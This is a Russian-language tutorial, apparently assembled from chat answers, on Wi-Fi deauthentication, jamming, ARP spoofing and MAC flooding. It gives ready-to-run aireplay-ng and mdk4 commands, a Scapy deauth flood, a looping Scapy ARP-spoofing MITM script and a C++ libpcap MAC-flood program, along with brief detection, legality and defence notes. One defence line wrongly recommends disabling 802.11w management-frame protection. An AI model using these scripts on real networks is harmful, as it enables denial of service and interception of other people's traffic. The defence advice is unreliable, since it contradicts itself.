


🔸 Wi-Fi Deauth-атака (Deauthentication Attack) — это тип атаки на беспроводные сети, которая принудительно отключает клиентов от точки доступа (роутера) путем отправки поддельных управляющих фреймов. Это один из самых распространенных методов в тестировании на проникновение (пентесте) и хакерских атаках.

1. Как работает Wi-Fi Deauth-атака?
🔹 Основной принцип
В Wi-Fi (стандарт IEEE 802.11) есть управляющие фреймы, включая Deauthentication (деаутентификация) и Disassociation (разъединение).

Эти фреймы используются для корректного отключения клиента от сети.

Атакующий подделывает эти фреймы, заставляя жертву думать, что они пришли от роутера, или наоборот.

🔹 Технические детали
Формат Deauth-фрейма:

Тип: Management Frame (0x00).

Подтип: Deauthentication (0x0C).

Содержит MAC-адреса:

Sender MAC (отправитель, например, роутер).

Receiver MAC (получатель, например, клиент).

Причина отключения (обычно Reason Code: 7 — "Class 3 frame received from nonassociated STA").

Как атакующий отправляет фреймы?

Используется режим монитора (Monitor Mode) Wi-Fi адаптера.

Инструменты вроде aireplay-ng, mdk4 или Python-скрипты (scapy) генерируют фейковые Deauth-фреймы.

Что происходит у жертвы?

Устройство (телефон, ноутбук) получает фрейм и немедленно отключается.

В большинстве случаев устройство автоматически переподключается, но атакующий может повторять атаку.

2. Примеры атак
🔹 1. Отключение одного клиента
bash
Copy
aireplay-ng --deauth 100 -a <BSSID_роутера> -c <MAC_клиента> wlan0mon
100 — количество фреймов.

-a — MAC роутера.

-c — MAC жертвы.

🔹 2. Массовая атака (все клиенты)
bash
Copy
mdk4 wlan0mon d -b blacklist.txt
(где blacklist.txt содержит BSSID точек доступа).

🔹 3. Через Python (Scapy)
python
Copy
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth

iface = "wlan0mon"          # Интерфейс в режиме монитора
target_mac = "AA:BB:CC:DD:EE:FF"  # MAC жертвы
ap_mac = "11:22:33:44:55:66"      # MAC роутера

# Создаем Deauth-фрейм
pkt = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()

# Отправляем в цикле
sendp(pkt, iface=iface, count=1000, inter=0.1)
3. Зачем это используется?
🔹 1. Тестирование безопасности (пентест)
Проверка устойчивости сети к атакам.

Анализ поведения клиентов при переподключении.

🔹 2. Кража данных (Evil Twin)
Жертву отключают от легитимной сети.

Создают фальшивую точку доступа с таким же именем (SSID).

Перехватывают трафик (логины, пароли).

🔹 3. DoS-атака
Полное блокирование Wi-Fi сети (если атакуются все клиенты).

4. Как защититься?
🔹 1. Для пользователей
WPA3 (лучше, чем WPA2) — устойчив к некоторым атакам.

Отключение 802.11w (Management Frame Protection, MFP) — если роутер поддерживает, включает защиту Deauth-фреймов.

Скрытие SSID (но это слабая защита).

🔹 2. Для администраторов сетей
RADIUS-аутентификация (802.1X) — сложнее атаковать.

Анализ аномального трафика (IDS/IPS, например, Kismet).

Фильтрация MAC-адресов (но это обходится).

🔹 3. Обнаружение атаки
Wireshark (фильтр: wlan.fc.type_subtype == 0x0C).

Команда на Linux:

bash
Copy
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0c" -c 100
5. Законность
В большинстве стран Deauth-атака незаконна, если выполняется без разрешения.

Используется только в этичном хакинге (с согласия владельца сети).











🔹 1.3. Wi-Fi Jamming (глушение сигнала)
Bash (используем mdk4 для DoS Wi-Fi)

# Установка mdk4 (Kali Linux)
sudo apt install mdk4

# Запуск атаки на конкретный канал (например, 6)
sudo mdk4 wlan0 d -c 6
Что делает:

Глушит Wi-Fi на указанном канале, делая сеть недоступной.











2. Канальный уровень (Layer 2)
🔹 2.1. ARP Spoofing (MITM-атака)
Python (Scapy) — подмена ARP-таблиц

from scapy.all import *
import time

target_ip = "192.168.1.100"    # Жертва
gateway_ip = "192.168.1.1"     # Роутер
iface = "eth0"                 # Сетевой интерфейс

def spoof():
    # Подменяем ARP-кэш жертвы (говорим, что мы — роутер)
    pkt = ARP(op=2, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=gateway_ip)
    send(pkt, iface=iface)

    # Подменяем ARP-кэш роутера (говорим, что мы — жертва)
    pkt = ARP(op=2, pdst=gateway_ip, hwdst=getmacbyip(gateway_ip), psrc=target_ip)
    send(pkt, iface=iface)

# Запускаем атаку каждые 2 секунды
while True:
    spoof()
    time.sleep(2)
Как запустить:


sudo python3 arp_spoof.py
Что делает:

Перенаправляет трафик жертвы через атакующего (Man-in-the-Middle).

Для перехвата трафика можно использовать Wireshark или BetterCAP.















🔹 2.2. MAC-флуд (перегрузка коммутатора)
C++ (используем libpcap)
cpp
Copy
#include <pcap.h>
#include <cstring>

int main() {
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live("eth0", BUFSIZ, 1, 1000, errbuf);

    u_char packet[60];
    memset(packet, 0xff, 6);  // MAC назначения: FF:FF:FF:FF:FF:FF (broadcast)
    for (int i = 0; i < 10000; i++) {
        packet[6] = rand() % 256;  // Рандомный MAC отправителя
        pcap_sendpacket(handle, packet, 60);
    }
    pcap_close(handle);
    return 0;
}
Как скомпилировать и запустить:


g++ mac_flood.cpp -lpcap -o mac_flood
sudo ./mac_flood
Что делает:

Отправляет фальшивые MAC-адреса, перегружая таблицу коммутатора.

3. Защита от атак
🔒 Физический уровень
Wi-Fi: WPA3, отключение WPS, скрытие SSID.

Ethernet: Использование 802.1X (Port Security).

🔒 Канальный уровень
ARP Spoofing: arpwatch, Dynamic ARP Inspection (Cisco).

MAC-флуд: Port Security на коммутаторах.